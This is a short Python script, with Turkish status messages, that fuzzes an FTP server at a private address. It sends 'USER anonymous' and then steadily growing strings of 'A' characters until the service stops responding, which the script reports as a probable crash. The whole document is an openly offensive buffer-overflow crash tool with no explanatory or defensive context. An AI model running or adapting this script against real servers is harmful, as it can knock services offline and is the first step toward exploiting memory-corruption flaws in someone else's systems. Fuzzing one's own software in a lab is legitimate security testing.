
#!/usr/bin/python
import sys,socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.3.11',21))

counter = 100
buffer = ""
result = 0

while (result != 1 ):
	buffer += "A" * counter
	counter += 50
	print ('[+] bytes %s gonderiliyor . . .' % len(buffer))
	try:
		
		
		s.send('USER anonymous \r\n')
		s.recv(1024)
		s.send('asim' + buffer + '\r\n')
		s.recv(1024)
		print("BASARILI[+]")
	
	except:

		print ("hata uygulama crash etmis olabilir[.!]")
		result = 1

	buffer = ""
